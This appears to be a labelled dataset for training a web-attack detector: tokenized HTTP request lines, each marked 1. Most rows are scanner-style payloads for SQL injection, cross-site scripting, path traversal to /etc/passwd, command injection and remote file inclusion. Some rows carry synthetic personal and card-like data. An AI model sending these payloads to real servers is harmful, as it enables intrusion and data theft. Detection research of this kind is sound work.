sentences 	 labels
/ string & strings & parameters = & echo $ ifstbohol $  (  ( 39 + 63 )  )  $  ( echo $ ifstbohol ) tbohol \  \  	 1
/ en-us &  < script > cross_site_scripting . nasl <  & script >  . mscgi  	 1
/ string & strings & parameters = 1 %  '  or 6979 = like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  --  	 1
/  % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 % uff0e % uff0e % u2216 { file }  	 1
/ phpinfo . php ? variable =  < script > alert (  ' vulnerable '  )  <  ? variable =  < script > alert (  ' vulnerable '  )  <  / script >  	 1
/ string & strings & parameters = 1 %  "  "  )  )  )  ; create or replace function sleep ( int )  returns int as  '  & lib & libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  and  (  (  (  "  "  %  "  "  =  "  "  	 1
/ examples & jsp & sessions & top . php ? header =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ cgi-bin ? username =  "  < script > foo <  ? username =  "  < script > foo <  / script  	 1
/ string & id =  @ 40 & nombre = jamn + ibrico & precio = 100 & cantidad = 59 & b1 = aadir + al + carrito  	 1
/ string & strings & parameters = |   [  7 -ne  $  ( echo lamxkc  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ string & b2 =  @ 40  	 1
/ dslpwt15 . jsp ?  < script > document . cookie =  " testtkio = 5454 ;  "  <  ?  < script > document . cookie =  " testtkio = 5454 ;  "  <  / script >  	 1
/ downloads & pafiledb . php ? action = download & id = 4 ?  \  "  & lt ; script & gt ; alert (  ' vulnerable '  )  & lt ;  / script & gt ;  \  "  	 1
/ string & strings & parameters = "  & echo $ ifstzxmjd $  (  ( 12 + 74 )  )  $  ( echo $ ifstzxmjd ) tzxmjd |  	 1
/ string & strings & parameters = -5524 )  as eoyk where 6928 = 6928 union all select 6928 , 6928 , 6928 , 6928 , 6928 , 6928 , 6928 , 6928 , 6928 --  	 1
/ string & modoa = registro & login = amjad & password = monjo & nombre = pancracio & apellidos = cornelas & email = linaker1 @ naturalchild . pm & dni = 04121787a & direccion = codigo + apartados + particulares + oficiales + y + lista ,  + 19 +  & ciudad = cendea + de + olza & oltza + zendea & cp = 06176 & provincia = soria & ntc = 2476472046518932 & b1 = registrar  	 1
/ main . php ? logout =  ' uname \ x09 > q76232693 \ x09 #? logout =  ' uname \ x09 > q76232693 \ x09 #  	 1
/ string & strings & parameters = < a href =  `  ` shell : system `  `  >  	 1
/ main . php ? logout =  "  ; uname  > q32339726  #? logout =  "  ; uname  > q32339726  #  	 1
/ string & strings & parameters = 1 '  )  )  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  (  (  ' pbtf '  =  ' pbtf  	 1
/ string & strings & parameters = $  { passthru ( print (  ` echo uounqt `  .  ` echo  $  (  ( 2 + 66 )  )  `  .  ` echo uounqt `  .  ` echo uounqt `  )  ;  .  " uounqt  	 1
/ _vti_bin &  .  .  \ xc0 &  .  .  \ xc0 &  .  .  \ xc0 &  .  .  \ xc0 &  .  .  \ xc0 &  .  .  & winnt & system32 & cmd . exe ?  / c + dir + c :  \  +  / og  	 1
/ hipkz026 . x ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  	 1
/ string & strings & parameters = '   str =  $  ( echo fplfhr )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  \  \  	 1
/ string & strings & parameters = *  (  |  ( objectclass =  *  )  )  	 1
/ string & strings & parameters = 1 '  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo ooyllh )  ;  str1 =  $  {  # str }  ;  if  [  1 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  	 1
/ string & strings & parameters = '  |   [  6 -ne  $  ( echo hywctj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  &  	 1
/ string & strings & parameters = "  |   [  5 -ne  $  ( echo ypwxzb  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \  \  	 1
/ string & modo = entrar "  + and +  " 1 "  =  " 1 & login = brownlee & pwd = aluminada & remember = off & b1 = entrar  	 1
/ string & strings & parameters = -8112 '  )  )  )  or 3440 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  and  (  (  (  ' xopg '  =  ' xopg  	 1
/ iissamples & sdk & asp & docs & winmsdp . exe ? source =  / iissamples /  \ xc0 \ xae \ xc0 \ xae / default . asp  	 1
/ string & strings & parameters = '   str =  $  ( echo ggpyar )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ manager & index . php ? configfile =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo prkges )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  &  	 1
/ string & strings & parameters = & lt ; meta http-equiv =  \  " refresh \  "  content =  \  " 0 ;  url = http &  # 58 ;  &  &  ; url = javascript &  # 058 ; alert (  ' xss '  )  ;  \  "  	 1
/ string & strings & parameters = ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4501 = 4501 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  	 1
/ en-us & account & index . php ? show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 and 4386 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  #  lexm  	 1
/ ny1b3qq4 . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & modo = registro & login = youngman & password = a018699t0do & nombre = ibar & apellidos = bald + almansa & email = damboise @ automovilesalhambra . co & dni = 44906096e & direccion = calle + lima ,  + 50 + 9-d & ciudad = catadau & cp = 42066 & provincia = madrid & ntc = 0908077134973737 & b1 = registrar +  	 1
/ help . php ? q =  \ x0duname \ x09 > q32573245 \ x09 #? q =  \ x0duname \ x09 > q32573245 \ x09 #  	 1
/ string & strings & parameters = -1134 "  "  union all select 4865 , 4865 , 4865 , 4865 , 4865 #  	 1
/ string & strings & parameters = "  |  | echo $ ifsmtadsx $  (  ( 4 + 83 )  )  $  ( echo $ ifsmtadsx ) mtadsx &  	 1
/ egaet53a . do ?  < script > cross_site_scripting . nasl <  ?  < script > cross_site_scripting . nasl <  / script >  	 1
/ main . php ? logout =  " ping \ x09-w \ x099000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 & rem \ x09? logout =  " ping \ x09-w \ x099000 \ x09-n \ x091 \ x091 . 2 . 3 . 4 & rem \ x09  	 1
/ string & strings & parameters = &  sleep 0  &  &  str =  $  ( echo vdsmtk )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 1
/ m2f & m2f_cron . php ? m2f_root_path = xxpathxx  	 1
/ string & strings & parameters = 1 '  )  )  )  and 6537 = dbms_pipe . receive_message ( chr ( 76 )  |  | chr ( 116 )  |  | chr ( 117 )  |  | chr ( 65 )  , 5 )  and  (  (  (  ' xngr '  =  ' xngr  	 1
/ string & strings & parameters = 1 ; select  ( case when  ( 4769 = 4769 )  then 4769 else 4769 *  ( select 4769 from mysql . db )  end )  #  	 1
/ string & strings & parameters = 1 )  )  )  order by 1 --  	 1
/ string & strings & parameters = < base href =  "  " javascript : alert (  ' xss '  )  ;  &  &  "  "  >  	 1
/ cgi-bin & directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = < script >  [  { get [ alert ( 1 )  ]  (  ) false }  ]  <  & script >  	 1
/ string & strings & parameters = 1 "  "  ; waitfor delay  ' 0 : 0 : 5 '  and  "  " lhcv "  "  =  "  " lhcv  	 1
/ string & strings & parameters = 1 %  "  "  )  )  or 4240 =  ( select 4240 from pg_sleep ( 5 )  )  --  	 1
/ string & strings & parameters = 1 )  as hhly where 2906 = 2906 ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 --  	 1
/ string & strings & parameters = -2432 '  )  )  or  ( 8459 = 8459 )  * 4906 and  (  (  ' ejhp '  =  ' ejhp  	 1
/  .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 .  .  % u2215 { file }  	 1
/ string & strings & parameters = select user from sysibm . sysdummy1 ;  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo agksyr )   &  &  str1 =  $  {  # str }   &  &   [  5 -eq  $  { str1 }   ]   &  &  sleep 1  \  \  	 1
/ help . php ? q =  " ver \ x0b > q49522765 & rem \ x0b? q =  " ver \ x0b > q49522765 & rem \ x0b  	 1
/ r3le3om5 . x ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = 1 '  where 2913 = 2913 and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  --  	 1
/ string & strings & parameters = -1 < img style =  "  " crosssitescripting : expr &  * crosssitescripting *  & ession ( document . cookie = true )  "  "  >  	 1
/ a0imiuf1 . idc ?  < meta http-equiv = set-cookie content =  " testxqrn = 4654 "  >?  < meta http-equiv = set-cookie content =  " testxqrn = 4654 "  >  	 1
/ edzaia0i . kspx ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ string & strings & parameters = echo drfynb $  (  ( 7 + 97 )  )  $  ( echo drfynb ) drfynb |  	 1
/ document . secin . password . value  	 1
/ javascript & _test . exe  	 1
/ string & strings & parameters = 1 "  "  )  )  as etap where 8506 = 8506 union all select null , null , null , null #  	 1
/ javascript &  . passwd . py  	 1
/ string & strings & parameters = "  " http :  &  & www . google . com .  &  "  "  > xss <  & a >  	 1
/ bmeun223 . mscgi ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  ?  < script > document . cookie =  " testhhwu = 7044 ;  "  <  / script >  	 1
/ fcgi-bin & windmail . exe  	 1
/ string & strings & parameters = '  &  sleep 0  &  &  str =  $  ( echo hpibfr )   &  &  str1 =  $  {  # str }   &  &   [  4 -eq  $  { str1 }   ]   &  &  sleep 1  '  	 1
/ modx-0 . 9 . 6 . 2 & assets & snippets & reflect & snippet . reflect . php ? reflect_base = xxpathxx ?  	 1
/ string & modo = registro '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & login = laz & password = d4s8ab8 & nombre = caledonia & apellidos = antonioli + blanc & email = rao @ ajuntamentdebarcelona20 . vu & dni = 99892750r & direccion = c &  + puerto + de + la + luz + 129 ,  +  & ciudad = valverde + del + majano & cp = 34126 & provincia = baleares +  ( illes )  & ntc = 4228631856170637 & b1 = registrar  	 1
/ string & strings & parameters = |  | echo $ ifsdajjoa $  (  ( 63 + 6 )  )  $  ( echo $ ifsdajjoa ) dajjoa &  &  	 1
/ string & strings & parameters = -2372 '  or 1783 = 2656  	 1
/ help . php ? q =  "  ; rm \ x09q21654461 \ x09 #? q =  "  ; rm \ x09q21654461 \ x09 #  	 1
/ string & strings & parameters = 1 waitfor delay  ' 0 : 0 : 5 '  --  	 1
/ script & ident & identification . php ? path_inc = http :  /  / 192 . 168 . 202 . 96 : 8080 / 4dckqcc0acprbz ?  	 1
/ string & strings & parameters = 1 and 2853 = cast (  ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  )  |  |  ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end )  )  :  : text |  |  ( chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  as numeric )  --  jdia  	 1
/ includes & lib-log . inc . php ? conf_config_path = xxpathxx ?  	 1
/ string & strings & parameters = 1 "  "  )  )  rlike  ( select  ( case when  ( 8179 = 1246 )  then 1 else 0x28 end )  )  and  (  (  "  " xxeu "  "  =  "  " xxeu  	 1
/ cgi-bin & embed & day . php ? path =  / etc / passwd \ x00  	 1
/ string & strings & parameters = < script >  [  {  ' a '  : object . prototype . __definesetter__ (  ' b '  , function (  )  { alert ( arguments [ 0 ]  )  }  )  ,  ' b '  :  [  ' secret '  ]  }  ]  <  & script >  	 1
/ cgi-bin & athenareg . php ? pass =   ; id  	 1
/ webcgi & a1stats & a1disp4 . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ javascript & soap . exe  	 1
/ ghswfouu . php3 ?  < script > document . cookie =  " testsqmm = 5713 ;  "  <  ?  < script > document . cookie =  " testsqmm = 5713 ;  "  <  / script >  	 1
/ javascript &  . passwd . doc  	 1
/ javascript &  . passwd . ep  	 1
/ help . php ? q =  '  & uname \ x09 > q78257168 \ x09 #? q =  '  & uname \ x09 > q78257168 \ x09 #  	 1
/ string & modo = registro & login = robbie & password = 7nexor40ilidad & nombre = milet & apellidos = alles + araujo & email = adix_adam @ easyviaggio . com . km & dni = 56876585t & direccion = calle + juan + montilla ,  + 50 + 1-a & ciudad = paterna & cp = 45870 '  + delete + from + users & provincia = navarra & ntc = 9173328900592385 & b1 = registrar  	 1
/ scripts & phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332008322 & lang_crm =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  / etc / passwd \ x00  	 1
/ string & strings & parameters = |   [  2 -ne  $  ( echo wigalp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  "  	 1
/ string & strings & parameters = >  "  "  < xml id = i >  < x >  < c >  <  !  [ cdata [  < img src =  "  " javas ]  ]  <  !  [ cdata [ cript : document . cookie = true ;  "  "  >  ]  ]  <  & c >  <  & x >  <  & xml >  < span datasrc =  # i datafld = c dataformatas = html >  <  & span >  	 1
/ cgi-win & dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  	 1
/ string & strings & parameters = 1 '  in boolean mode )  union all select null , null #  	 1
/ string & strings & parameters = -6965 '  )  union all select 2857 , 2857 , 2857 , 2857 , 2857 , 2857 , 2857 , 2857 , 2857 , 2857 --  	 1
/ string & strings & parameters = '  |   [  8 -ne  $  ( echo pspape  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  &  	 1
/ javascript & document . csproj  	 1
/ cgi-local & pfdispaly . cgi ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ en-us & account & ion-p . exe ? page = c :  \  \ winnt \  \ win . ini  	 1
/ string & strings & parameters = 1 "  "  )  where 6311 = 6311 ; select  *  from generate_series ( 4592 , 4592 , case when  ( 4592 = 4592 )  then 1 else 0 end )  limit 1 --  	 1
/ string & strings & parameters = -1 < head >  < meta http-equiv =  "  " content-type "  "  content =  "  " text & html ;  charset = utf-7 "  "  >   <  & head >  + adw-script + ad4-document . cookie = true ;  + adw- & script + ad4-  	 1
/ string & str =  $  ( echo dplqys )   str1 =  $  {  # str }   if  [  9 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  	 1
/ i7prbs22 . cgi ?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >  	 1
/ 0z575z74 . nsf ?  < script > document . cookie =  " testuhsv = 9753 ;  "  <  ?  < script > document . cookie =  " testuhsv = 9753 ;  "  <  / script >  	 1
/ string & strings & parameters = 1 %  "  "  )  and 7533 = 7533 and  (  "  "  %  "  "  =  "  "  	 1
/ cgi-bin & starnet & addons & slideshow_full . php ? album_name =  ' 1999868906  	 1
/ azcrfs8d . x ?  < script > document . cookie =  " testjpdr = 9205 ;  "  <  ?  < script > document . cookie =  " testjpdr = 9205 ;  "  <  / script >  	 1
/ manager & scp . dll & sendto ? template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / boot . ini \ x00gwextranet_template_dir_traversal . nasl  	 1
/ extras & mt . php ? web_root = xxpathxx  	 1
/ string & strings & parameters = |   [  3 -ne  $  ( echo qhewvv  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  #  	 1
/ string & modo = insertar & precio = 5154 & b1 = pasar + por + caja &  	 1
/ string & strings & parameters = 1 where 2988 = 2988 or 1022 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  --  	 1
/ string & strings & parameters = < a href =  " http :  &  & 1113982867 &  "  > xss <  & a >  	 1
/ manager & htmlscript ?  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ string & modo = registro & login = bnrecad & password = in ! soluble & nombre = aurelio & apellidos = ospina + soma & email = humbert @ 24htranslations . name & dni = 78151636m & direccion = ramat ,  + 145 + 5 ? b & ciudad = barbastro & cp = 31227 & provincia = valladolid & ntc = 5175468282615613 & b1 =  '  ;  + drop + table + usuarios ;  + select +  *  + from + datos + where + nombre + like +  ' %  	 1
/ php & php . exe ? c :  \ winnt \ win . ini  	 1
/ scripts & phprint . php ? module = vtiger_lang_crm_lfi . nasl & action = 1332009302 & lang_crm =  .  .  /  .  .  / vtigerservice . php \ x00  	 1
/ cgi-bin & msmmask . exe ? mask =  / junk334  	 1
/ en-us & hipkz026 . mscgi ?  < meta http-equiv = set-cookie content =  " testyrbs = 2855 "  >  	 1
/ scripts & fileseek2 . cgi ? foot =  & head =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd  	 1
/ string & strings & parameters = 1 '  in boolean mode )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 & 2 )  )  )  )  #  	 1
/ string & strings & parameters = < iframe & src =  " data : text & html ,  < svg	   	 1
/ 6qbynt4f . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ javascript & webcart . exe  	 1
/ string & strings & parameters = -3044 '  )  or 4999 = 3051 #  	 1
/ examples & jsp & checkbox & docs . php ? doc =  .  .  / jpgraph-1 . 12 . 1 / docs / index  	 1
/ string & strings & parameters = 1 where 8045 = 8045 union all select null , null , null --  	 1
/ string & strings & parameters = 1 )  as vzyk where 5103 = 5103 and 8312 = dbms_pipe . receive_message ( chr ( 69 )  |  | chr ( 79 )  |  | chr ( 101 )  |  | chr ( 68 )  , 5 )  --  	 1
/ string & strings & parameters = -5520 %  "  "  union all select 5235 , 5235 , 5235 , 5235 , 5235 , 5235 , 5235 , 5235 , 5235 , 5235 --  	 1
/ web & logout . php ? libsdir = xxpathxx  	 1
/ string & strings & parameters = 1 '  )  )  )  rlike sleep ( 5 )  and  (  (  (  ' rozr '  like  ' rozr  	 1
/ string & strings & parameters = @  & apos ;  	 1
/ string & modoa = registro & login = ettson & password = 6a86q3is2o & nombre = quinto & apellidos = corominas + corcoy & email = omiya_bogetti @ casablancabeach . gob & dni = 03995650k & direccion = c &  + reyes + magos + 130 ,  +  & ciudad = nuevo + baztn & cp = 07191 & provincia = zamora & ntc = 1916434162940533 & b1 = registrar  	 1
/ sablonlar & gunaysoft & gunaysoft . php ? sayfaid = xxpathxx  	 1
/ string & strings & parameters = 1 )  )  and make_set ( 8403 = 8403 , 8899 )  and  (  ( 4686 = 4686  	 1
/ string & strings & parameters = 1 %  '  )  )  ; waitfor delay  ' 0 : 0 : 5 '  --  	 1
/ string & strings & parameters = '  ;  str =  $  ( echo hldnyh )  ;  str1 =  $  {  # str }  ;  if  [  7 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  	 1
/ e9rx3ya4 . mscgi ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  	 1
/ admin & news . admin . php ? path_to_script = http :  /  / 192 . 168 . 202 . 118 : 8080 / zz5thkvtmlgl ?  ?  & cmd = ls  	 1
/  ?  < meta http-equiv = set-cookie content =  " testwtbo = 4831 "  >?  < meta http-equiv = set-cookie content =  " testwtbo = 4831 "  >  	 1
/ string & modo = entrar & login = culberso & pwd = r- '  , estau & 9ar & remember = off & b1 = entrar  	 1
/ string & modo = registro & login = izique & password = 48a6850ll3 & nombre = otilia & apellidos = aliverti_ + sanandre ? u & email = divoka @ mercadozoom . bf & dni = 36504708m & direccion = calle + bolivia ,  + 69 ,  +  & ciudad = avils & cp = 22468 & provincia = len & ntc = 1926544477784446 & b1 = registrar  	 1
/ cgi-exe & ustorekeeper . pl ? command = goto & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  	 1
/ javascript & announcement . exe  	 1
/ string & strings & parameters = < x xmlns =  " http :  &  & www . w3 . org & 2001 & xml-events "  event =  " load "  observer =  " foo "  handler =  " data : image & svg + xml ,  < svg xmlns =  " http :  &  & www . w3 . org & 2000 & svg "  >   < handler xml : id =  " bar "  type =  " application & ecmascript "  >  alert ( 104 )   <  & handler >   <  & svg >   # bar "  &  >  	 1
/ string & strings & parameters = 1 where 4319 = 4319 and 8635 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  --  	 1
/ string & strings & parameters = 1 )  where 1193 = 1193 procedure analyse ( extractvalue ( 9255 , concat ( 0x5c ,  ( benchmark ( 5000000 , md5 ( 0x52515a50 )  )  )  )  )  , 1 )  --  	 1
/ bmeun223 . html ?  < meta http-equiv = set-cookie content =  " testhhwu = 7044 "  >?  < meta http-equiv = set-cookie content =  " testhhwu = 7044 "  >  	 1
/ string & strings & parameters = ; echo $ ifsorhoea $  (  ( 71 + 59 )  )  $  ( echo $ ifsorhoea ) orhoea &  	 1
/ string & modo = insertar & precio = 4074 & b1 = pasar + por + caja &  	 1
/ betablockmodules & flickrmodule & flickrmodule . php ? path_prefix = xxpathxx  	 1
/ string & strings & parameters = 1 )  where 6788 = 6788 union all select null , null , null , null , null , null , null , null , null --  	 1
/ string & strings & parameters = -3462 '  )  )  or 4493 = utl_inaddr . get_host_address ( chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  )  and  (  (  ' cxku '  like  ' cxku  	 1
/ help . php ? q = ver  > q77858339 & rem? q = ver  > q77858339 & rem  	 1
/ string & strings & parameters = -1339 )  )  )  union all select 2938 , 2938 , 2938 , 2938 , 2938 , 2938 #  	 1
/ string & strings & parameters = < script a =  `  >  `  id = xss src =  "  " http :  &  & ha . ckers . org & xss . js "  "  >  <  & script >  	 1
/ string & modo = registro & login = ramzi & password = ne9ot '  & i80o & nombre = nlida & apellidos = abdenur & email = gonard . guercio @ cincocolores . va & dni = 51810988s & direccion = c &  + sanchez + mejias ,  + 156 + 4 ? c & ciudad = alesn & cp = 37621 & provincia = huesca & ntc = 6770340402542375 & b1 = registrar  	 1
/ belegungsplan & jahresuebersicht . inc . php ? root = xxpathxx  	 1
/ string & modo = registro & login = etienne "  >  <  !  --  # exec + cmd =  " dir +  "  --  >  <  & password = ahoga2iz8 & nombre = pastora & apellidos = aleu + alcaide & email = gulager-balsan6 @ 978 . dm & dni = 44544869x & direccion = giuseppe + micael ,  + 174 + 8-h & ciudad = valdefuentes + del + pramo & cp = 06300 & provincia = ciudad + real & ntc = 5699405800944222 & b1 = registrar  	 1
/ string & strings & parameters = 1 "  "  )  )  ; select count (  *  )  from rdb $ fields as t1 , rdb $ types as t2 , rdb $ collations as t3 , rdb $ functions as t4 --  	 1
/ cgi-bin & articles & default . asp ? ichannel = duportal_sql_injections2 . nasl '  & nchannel = articles  	 1
/ iv5vkgam . cgi ?  < script > document . cookie =  " testfosd = 94 ;  "  <  ?  < script > document . cookie =  " testfosd = 94 ;  "  <  / script >  	 1
/ string & strings & parameters = | echo $ ifscetcmo $  (  ( 72 + 54 )  )  $  ( echo $ ifscetcmo ) cetcmo |  	 1
/ odzk29aa . fts ?  < meta http-equiv = set-cookie content =  " testtfvh = 2141 "  >?  < meta http-equiv = set-cookie content =  " testtfvh = 2141 "  >  	 1
/ string & strings & parameters = < embed src =  " http :  &  & corkami . googlecode . com & svn &  ! svn & bc & 480 & trunk & misc & pdf & helloworld_js_x . pdf "  >   ?  	 1
/ help . php ? q =  " ver \ x0b > q54818771 & rem \ x0b? q =  " ver \ x0b > q54818771 & rem \ x0b  	 1
/ string & strings & parameters = $  { passthru ( print (  ` echo ovsnxt \ necho  $  (  ( 21 + 17 )  )  \ necho ovsnxt \ necho ovsnxt `  )  ;  )  } ovsnxt  	 1
/ top . php ? stuff =  ' uname \ x09 > q39954515 \ x09 #? stuff =  ' uname \ x09 > q39954515 \ x09 #  	 1
/ en-us & account & calendar_admin . pl ? config =  | cat  / etc / passwd |  	 1
/ main . php ? logout =  "  & rm \ x0cq31768299 & rem \ x0c? logout =  "  & rm \ x0cq31768299 & rem \ x0c  	 1
/ string & strings & parameters = | echo $ ifszgmesr $  (  ( 73 + 1 )  )  $  ( echo $ ifszgmesr ) zgmesr &  &  	 1
